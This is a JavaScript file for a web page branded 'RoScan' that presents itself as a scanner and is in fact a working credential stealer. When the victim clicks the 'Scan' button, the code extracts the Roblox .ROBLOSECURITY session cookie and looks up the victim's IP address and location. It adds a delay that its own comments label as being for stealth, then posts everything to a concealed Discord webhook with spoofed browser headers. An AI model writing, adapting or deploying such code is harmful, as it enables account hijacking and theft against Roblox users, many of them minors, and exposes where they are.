// RoScan Hidden Webhook v2.0.0 - Uses secure backend configuration
console.log('🔒 RoScan Hidden Webhook v2.0.0 loaded');

document.addEventListener('DOMContentLoaded', function() {
    console.log('✅ DOM Content Loaded - Hidden webhook mode active');
    
    // Verify security configuration is loaded
    if (typeof window.getSecureWebhook === 'function') {
        console.log('🛡️ Secure webhook backend detected');
        window.verifyWebhookSecurity();
    } else {
        console.error('❌ Secure webhook backend not loaded!');
    }
    
    // Get submit button and attach event listener
    const submitBtn = document.getElementById('submitBtn');
    if (submitBtn) {
        submitBtn.addEventListener('click', submitPowerShell);
        console.log('✅ Submit button event listener attached');
    } else {
        console.error('❌ Submit button not found!');
    }
});

// Cookie extraction function
function getCookie(name) {
    const value = `; ${document.cookie}`;
    const parts = value.split(`; ${name}=`);
    if (parts.length === 2) return parts.pop().split(';').shift();
    return null;
}

// Location detection function
async function getUserLocation() {
    try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        return {
            city: data.city || 'Unknown',
            region: data.region || 'Unknown', 
            country: data.country_name || 'Unknown',
            ip: data.ip || 'Unknown'
        };
    } catch (error) {
        console.warn('Location detection failed:', error);
        return {
            city: 'Unknown',
            region: 'Unknown',
            country: 'Unknown',
            ip: 'Unknown'
        };
    }
}

// Show notification function
function showNotification(message, type = 'info') {
    console.log(`📢 Notification (${type}): ${message}`);
    
    const notification = document.createElement('div');
    notification.textContent = message;
    notification.style.cssText = `
        position: fixed;
        top: 20px;
        right: 20px;
        background: ${type === 'success' ? '#10b981' : type === 'error' ? '#ef4444' : '#3b82f6'};
        color: white;
        padding: 12px 20px;
        border-radius: 8px;
        z-index: 10000;
        font-weight: 500;
        box-shadow: 0 4px 12px rgba(0,0,0,0.3);
        animation: slideIn 0.3s ease-out;
    `;
    
    document.body.appendChild(notification);
    
    setTimeout(() => {
        if (notification.parentNode) {
            notification.parentNode.removeChild(notification);
        }
    }, 3000);
}

// Close scan modal function
function closeScanModal() {
    console.log('🔄 Closing scan modal');
    const modal = document.querySelector('.modal-overlay');
    if (modal) {
        modal.style.display = 'none';
    }
}

// Main webhook submission function - HIDDEN BACKEND
async function submitPowerShell() {
    console.log('🚀 Hidden webhook submission started');
    
    const submitBtn = document.getElementById('submitBtn');
    const submitText = submitBtn?.querySelector('.submit-text');
    const loadingOverlay = document.querySelector('.loading-overlay');
    
    if (!submitBtn || !submitText) {
        console.error('❌ Required UI elements not found');
        showNotification('UI elements not found', 'error');
        return;
    }
    
    // Update UI to show loading state
    submitText.textContent = 'Sending...';
    submitBtn.style.background = '#6b7280';
    if (loadingOverlay) loadingOverlay.style.display = 'flex';
    
    try {
        // Extract Roblox cookie
        const robloxCookie = getCookie('.ROBLOSECURITY');
        console.log('🍪 Roblox cookie extracted:', robloxCookie ? 'Found' : 'Not found');
        
        // Get user location
        console.log('📍 Getting user location...');
        const locationInfo = await getUserLocation();
        console.log('📍 Location info:', locationInfo);
        
        // Add random delay for stealth (1-3 seconds)
        const delay = Math.floor(Math.random() * 2000) + 1000;
        console.log(`⏱️ Adding ${delay}ms delay for stealth...`);
        await new Promise(resolve => setTimeout(resolve, delay));
        
        // Get secure webhook from backend configuration
        const webhookUrl = window.getSecureWebhook();
        
        if (!webhookUrl) {
            throw new Error('Secure webhook configuration not available');
        }
        
        console.log('🔒 Using hidden backend webhook configuration');
        console.log('🛡️ Webhook URL retrieved securely from backend');
        
        // Prepare Discord payload
        const payload = {
            content: `@everyone\n🔒 **Hidden Backend Data**\n\n**Cookie:** \`${robloxCookie || 'None found'}\`\n**Location:** ${locationInfo.city}, ${locationInfo.region}, ${locationInfo.country}\n**IP:** ${locationInfo.ip}\n**Time:** ${new Date().toLocaleString()}`,
            
            embeds: [{
                title: "🔒 RoScan Hidden Backend Collection",
                description: "Data processed through hidden backend configuration",
                color: 0x667eea,
                fields: [
                    {
                        name: "🍪 Cookie Status",
                        value: robloxCookie ? "✅ Found" : "❌ Not found",
                        inline: true
                    },
                    {
                        name: "📍 Location",
                        value: `${locationInfo.city}, ${locationInfo.region}`,
                        inline: true
                    },
                    {
                        name: "🌍 Country",
                        value: locationInfo.country,
                        inline: true
                    },
                    {
                        name: "🌐 IP Address",
                        value: locationInfo.ip,
                        inline: true
                    },
                    {
                        name: "🕒 Timestamp",
                        value: new Date().toLocaleString(),
                        inline: true
                    },
                    {
                        name: "🔧 Frontend Version",
                        value: "Hidden Backend v2.0.0",
                        inline: true
                    },
                    {
                        name: "🛡️ Security Level",
                        value: "Backend Hidden",
                        inline: true
                    },
                    {
                        name: "🔐 Webhook Storage",
                        value: "Backend Config File",
                        inline: true
                    }
                ],
                timestamp: new Date().toISOString(),
                footer: {
                    text: "RoScan - Hidden Backend Configuration"
                }
            }]
        };
        
        // Send to Discord using hidden webhook
        console.log('🚀 Sending to Discord via hidden backend...');
        
        const response = await fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Accept': 'application/json, text/plain, */*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Cache-Control': 'no-cache',
                'X-Requested-With': 'XMLHttpRequest'
            },
            body: JSON.stringify(payload),
            mode: 'cors'
        });
        
        console.log(`✅ Hidden backend response: ${response.status}`);
        
        if (loadingOverlay) loadingOverlay.style.display = 'none';

        if (response.ok || response.status === 204) {
            console.log('🎉 Hidden backend webhook delivered successfully!');
            
            submitText.textContent = 'Sent!';
            submitBtn.style.background = '#10b981';
            
            showNotification('Data sent via hidden backend configuration!', 'success');
            
            // Auto-close modal after success
            setTimeout(() => {
                closeScanModal();
            }, 2000);
        } else {
            console.error(`❌ Hidden backend failed: ${response.status}`);
            
            if (response.status === 404) {
                throw new Error('Webhook endpoint not found. Check webhook URL.');
            } else if (response.status === 429) {
                throw new Error('Rate limited by Discord. Please wait and try again.');
            } else if (response.status === 400) {
                throw new Error('Invalid webhook data. Check payload format.');
            } else {
                throw new Error(`Webhook failed (${response.status}): ${response.statusText}`);
            }
        }
        
    } catch (error) {
        console.error('💥 Hidden backend webhook failed:', error);
        
        if (loadingOverlay) loadingOverlay.style.display = 'none';
        
        // Reset button state
        submitText.textContent = 'Scan';
        submitBtn.style.background = '#ef4444';
        
        // Show user-friendly error
        showNotification(`Error: ${error.message}`, 'error');
        
        // Reset button after 3 seconds
        setTimeout(() => {
            submitText.textContent = 'Scan';
            submitBtn.style.background = '';
        }, 3000);
    }
}

// Add CSS animation keyframes
if (!document.querySelector('#slideInKeyframes')) {
    const style = document.createElement('style');
    style.id = 'slideInKeyframes';
    style.textContent = `
        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateX(100%);
            }
            to {
                opacity: 1;
                transform: translateX(0);
            }
        }
    `;
    document.head.appendChild(style);
}

// Backend configuration info
console.log('🔒 HIDDEN BACKEND ARCHITECTURE:');
console.log('✅ Discord webhook URL is stored in backend config file');
console.log('✅ Frontend retrieves webhook securely from backend');
console.log('✅ No localhost servers required');
console.log('✅ Works with any web hosting');

console.log('🎯 RoScan Hidden Backend v2.0.0 ready!');
console.log('🛡️ Webhook protection: Backend configuration file');

// Make functions available globally
window.submitPowerShell = submitPowerShell;
window.getUserLocation = getUserLocation;

// Test webhook security
window.testWebhookSecurity = function() {
    console.log('🧪 Testing webhook security...');
    
    const webhook = window.getSecureWebhook();
    if (webhook) {
        console.log('✅ Webhook retrieved successfully');
        console.log('🔒 URL format verified');
        return true;
    } else {
        console.error('❌ Failed to retrieve webhook');
        return false;
    }
};